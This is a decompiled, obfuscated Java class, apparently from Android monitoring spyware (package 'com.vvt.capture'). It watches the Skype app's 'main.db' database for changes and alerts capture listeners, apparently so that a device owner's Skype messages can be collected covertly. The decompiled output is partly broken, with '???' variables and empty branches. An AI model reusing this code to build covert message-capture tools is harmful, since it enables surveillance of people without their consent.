package com.vvt.capture.e.b.b;

import com.vvt.base.capture.h;
import com.vvt.io.p;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;

public class b
  implements com.vvt.n.a.a
{
  private static final boolean a = com.vvt.ak.a.e;
  private static final boolean b = com.vvt.ak.a.a;
  private static b d;
  private com.vvt.n.a.b c;
  private boolean e;
  private String f;
  private String g;
  private HashSet h;
  private String i;
  
  private b(com.vvt.n.a.b paramb, String paramString1, String paramString2)
  {
    this.c = paramb;
    this.e = false;
    HashSet localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    this.h = localHashSet;
    this.f = paramString1;
    this.i = paramString2;
  }
  
  public static b a(com.vvt.n.a.b paramb, String paramString1, String paramString2)
  {
    synchronized (b.class)
    {
      b localb = d;
      if (localb == null)
      {
        localb = new com/vvt/capture/e/b/b/b;
        localb.<init>(paramb, paramString1, paramString2);
        d = localb;
      }
      localb = d;
      return localb;
    }
  }
  
  private boolean a()
  {
    boolean bool1 = false;
    String str1 = b();
    String str2 = d.a(this.f);
    String str3 = this.f;
    String str4 = this.i;
    str3 = d.a(str3, str2, str1, str4);
    if (str3 != null)
    {
      str4 = "main.db";
      String str5 = this.i;
      str3 = d.a(str3, str1, str4, str2, str5);
      boolean bool2 = com.vvt.ag.b.a(str3);
      if (!bool2)
      {
        str3 = this.i;
        str1 = d.b(str2, str1, str3);
        boolean bool3 = com.vvt.ag.b.a(str1);
        if (!bool3)
        {
          str1 = com.vvt.capture.e.d.c(str1);
          str2 = this.g;
          if (str2 == null) {
            this.g = str1;
          }
          if (str1 != null)
          {
            str2 = this.g;
            bool3 = str1.equals(str2);
            if (!bool3)
            {
              this.g = str1;
              bool1 = true;
            }
          }
        }
      }
    }
    boolean bool4 = b;
    if (bool4) {}
    return bool1;
  }
  
  private String b()
  {
    return p.a(this.f, "skype");
  }
  
  public void a(h paramh)
  {
    boolean bool = b;
    if (bool) {}
    synchronized (this.h)
    {
      Object localObject2 = this.h;
      bool = ((HashSet)localObject2).contains(paramh);
      if (!bool)
      {
        localObject2 = this.h;
        ((HashSet)localObject2).add(paramh);
      }
      bool = this.e;
      if (bool) {
        break label143;
      }
      bool = true;
      this.e = bool;
      localObject2 = this.c;
      if (localObject2 != null)
      {
        localObject2 = com.vvt.n.a.e.b.a();
        ??? = ((List)localObject2).iterator();
        bool = ((Iterator)???).hasNext();
        if (!bool) {
          break label143;
        }
        localObject2 = (String)((Iterator)???).next();
        com.vvt.n.a.b localb = this.c;
        localb.b((String)localObject2, this);
      }
    }
    bool = a;
    if (bool) {}
    label143:
    bool = b;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    try
    {
      bool = b;
      if (bool) {}
      bool = a();
      if (bool)
      {
        Object localObject1 = this.h;
        localIterator = ((HashSet)localObject1).iterator();
        for (;;)
        {
          bool = localIterator.hasNext();
          if (!bool) {
            break;
          }
          localObject1 = localIterator.next();
          localObject1 = (h)localObject1;
          ((h)localObject1).c();
        }
      }
      localObject3 = this.h;
    }
    finally {}
    Object localObject3;
    Iterator localIterator = ((HashSet)localObject3).iterator();
    for (;;)
    {
      bool = localIterator.hasNext();
      if (!bool) {
        break;
      }
      localObject3 = localIterator.next();
      localObject3 = (h)localObject3;
      ((h)localObject3).a();
    }
    boolean bool = b;
    if (bool) {}
  }
  
  public void b(h paramh)
  {
    boolean bool1 = b;
    if (bool1) {}
    synchronized (this.h)
    {
      Object localObject2 = this.h;
      bool1 = ((HashSet)localObject2).contains(paramh);
      if (bool1)
      {
        localObject2 = this.h;
        ((HashSet)localObject2).remove(paramh);
      }
      localObject2 = this.h;
      int j = ((HashSet)localObject2).size();
      boolean bool3 = b;
      if ((bool3) && (j != 0)) {
        break label170;
      }
      bool2 = this.e;
      if (bool2)
      {
        bool2 = false;
        this.e = false;
        localObject2 = this.c;
        if (localObject2 != null)
        {
          localObject2 = com.vvt.n.a.e.b.a();
          ??? = ((List)localObject2).iterator();
          bool2 = ((Iterator)???).hasNext();
          if (bool2)
          {
            localObject2 = (String)((Iterator)???).next();
            com.vvt.n.a.b localb = this.c;
            localb.a((String)localObject2);
          }
        }
      }
    }
    boolean bool2 = false;
    Object localObject4 = null;
    this.g = null;
    label170:
    bool2 = b;
    if (bool2) {}
  }
  
  public void c(String paramString)
  {
    boolean bool = b;
    if (bool) {}
    Object localObject = this.h;
    Iterator localIterator = ((HashSet)localObject).iterator();
    for (;;)
    {
      bool = localIterator.hasNext();
      if (!bool) {
        break;
      }
      localObject = (h)localIterator.next();
      String str = "com.skype.raider";
      ((h)localObject).a(str, paramString);
    }
    bool = b;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/e/removeFromPath/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */